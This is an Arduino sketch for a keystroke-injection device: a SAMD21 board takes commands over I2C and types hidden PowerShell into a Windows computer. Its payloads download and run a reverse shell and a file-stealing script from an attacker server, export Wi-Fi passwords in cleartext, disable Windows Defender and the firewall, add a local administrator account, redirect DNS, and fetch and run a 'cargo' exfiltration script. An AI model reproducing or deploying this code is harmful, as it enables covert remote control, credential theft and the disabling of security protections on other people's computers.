// slave board code
#include <Wire.h>
#include <Keyboard.h>
#include "lib/simple-instructions.h"
#include "lib/complex-instructions.h"

// Define constants
const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
// Remove ledPin variable since we're using LED_BUILTIN

const char *server = "ip_address";
const char *port = "port";

const char *password = "password";
const char *username = "username";

const char *dns_server1 = "192.168.0.198";
const char *dns_server2 = "1.1.1.1";

const char *admin_username = "admin_username";
const char *admin_password = "admin_password";

// Add this function BEFORE executeCommand function
bool isValidCommandFormat(const String& command) {
    // List of valid commands
    const char* validCommands[] = {
        "BGCHANGE", "RS", "FR", "DNS", 
        "Wpass", "Ddefender", "Dfirewall", 
        "NewAdmin", "Cargo", "None"
    };
    
    const int numCommands = sizeof(validCommands) / sizeof(validCommands[0]);
    
    // Check if the command matches any valid command
    for (int i = 0; i < numCommands; i++) {
        if (command == validCommands[i]) {
            return true;
        }
    }
    return false;
}

void setup()
{
  Wire.begin(I2C_MASTER_ADDR);  // Initialize I2C as slave
  Keyboard.begin();             // Initialize the Keyboard library
  Wire.onReceive(receiveEvent); // Register the receive event handler
  Serial.begin(115200);         // Initialize Serial for debugging
  pinMode(LED_BUILTIN, OUTPUT); // Initialize built-in LED
  Serial.println("SAMD21 ready to receive commands over I2C");
}

void loop() {
  // The loop is empty because all the work is done in the receiveEvent function
}

void receiveEvent(int bytes) {
  String command = "";
  while (Wire.available()) {
    char c = Wire.read();
    command += c;
  }
  Serial.println("Received command: " + command);
  executeCommand(command);
}

void executeCommand(String command)
{
  // Add command validation before execution
  if (!isValidCommandFormat(command)) {
    return;
  }

  if (command == "BGCHANGE")
  { // Change Desktop Background
    openPowerShell();
    Serial.println(command);
    // Create a directory to store the wallpaper
    Keyboard.println("New-Item -ItemType Directory -Force -Path \"C:\\Users\\Public\\Pictures\" | Out-Null");
    // Download the image (replace URL with your image URL)
    Keyboard.println("Invoke-WebRequest -Uri 'https://example.com/wallpaper.jpg' -OutFile 'C:\\Users\\Public\\Pictures\\wallpaper.jpg'");
    // Set the wallpaper using SystemParametersInfo
    String payload = "$code = @'\n";
    payload += "[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]\n";
    payload += "public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);\n";
    payload += "'@\n";
    payload += "$user32 = Add-Type -MemberDefinition $code -Name 'Wallpaper' -Namespace User32 -PassThru\n";
    payload += "$user32::SystemParametersInfo(20,0,'C:\\Users\\Public\\Pictures\\wallpaper.jpg',3)";
    Keyboard.println(payload);
  }
  else if (command == "RS")
  { // Reverse Shell
    openPowerShell();
    Serial.println(command);
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "FR")
  { // File Retriever
    openPowerShell();
    Serial.println(command);
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/file_retriever.ps1' -OutFile 'C:\\Users\\Public\\file_retriever.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\file_retriever.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "DNS")
  { // Set DNS Server
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi' -ServerAddresses '" + String(dns_server1) + "', '" + String(dns_server2) + "'\"";
    killall();
    openPowerShellAdmin();
    // openPowerShell();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Wpass")
  { // Retrieve Wi-Fi Passwords
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass netsh wlan export profile key=clear folder=C:\\temp";
    openPowerShell();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Ddefender")
  { // Disable Windows Defender
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Dfirewall")
  { // Disable Windows Firewall
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"netsh advfirewall set allprofiles state off;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "NewAdmin")
  { // Create a new admin user
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"net user " + String(admin_username) + " " + String(admin_password) + " /add; net localgroup administrators " + String(admin_username) + " /add;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Cargo") {
    openPowerShell();
    Keyboard.println("New-Item -ItemType Directory -Force -Path \"C:\\CARGO\" | Set-Location -PassThru");
    Keyboard.println("echo {\"URL\": \"api.example.com\", \"Port\": \"443\", \"esp_id\": \"your_esp_id_here\", \"delivery_key\": \"your_delivery_key_here\", \"encryption_password\": \"YourEncryptionPassword\"} > cred");
    Keyboard.println("Invoke-WebRequest https://www.7-zip.org/a/7zr.exe -OutFile c:\\7zr.exe");
    Keyboard.println("Invoke-WebRequest https://github/cargo.ps1 -OutFile c:\\cargo.ps1");
    Keyboard.println("PowerShell.exe -ExecutionPolicy Bypass -File cargo.ps1");
  }
  else if (command == "None") {
    for (int i = 0; i < 20; i++)
    {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(50);
      digitalWrite(LED_BUILTIN, LOW);
      delay(50);
    }
    digitalWrite(LED_BUILTIN, LOW);
  }
  else 
  {
    Serial.println("Invalid command");
    for (int i = 0; i < 10; i++)
    {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(250);
      digitalWrite(LED_BUILTIN, LOW);
      delay(250);
    }
    digitalWrite(LED_BUILTIN, LOW);
  }
  // Add more commands as needed
}

// Should implement response handling
// The commented-out response function should be completed